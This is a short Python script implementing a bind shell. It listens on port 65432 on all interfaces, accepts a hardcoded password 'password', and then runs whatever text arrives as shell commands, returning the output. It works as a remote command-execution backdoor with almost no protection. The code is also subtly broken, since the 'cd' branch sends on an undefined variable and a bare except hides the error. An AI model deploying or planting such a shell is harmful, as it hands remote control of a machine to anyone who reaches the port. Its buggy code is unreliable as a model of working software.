

import socket
import subprocess
import os

class Server:
    def __init__(self):
        self.port = 65432  
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind(('', self.port))
        self.s.listen(1)
    
    def getDirPath(self):
        return os.getcwd() + ": "

    def connection(self):
        clientSocket, addr = self.s.accept()

        if self.login(clientSocket):
            clientSocket.send(self.getDirPath().encode())
            self.shell(clientSocket)
        else:
            clientSocket.send(bytes("exit", "utf-8"))
            clientSocket.close()
                
    def login(self, clientSocket):
        login = "Login: "
        clientSocket.send(login.encode())
        pwd = clientSocket.recv(1024).decode().strip()
        if pwd == "password":
            return True
        else:
            return False
    
    def shell(self, clientSocket):
        while True:
            data = clientSocket.recv(1024)
            if data.decode().strip() == "exit":
                clientSocket.send(bytes("exit", "utf-8"))
                clientSocket.close()
                break

            try:
                cmd, params = data.decode().split(" ", 1)
                if cmd.strip() == "cd":
                    os.chdir(params.strip())
                    s.send(self.getDirPath().encode())
                    continue
            except:
                pass

            proc = subprocess.Popen(data.decode().strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            clientSocket.send(output)
            clientSocket.send(self.getDirPath().encode())

def main():
    s = Server()
    s.connection()

main()



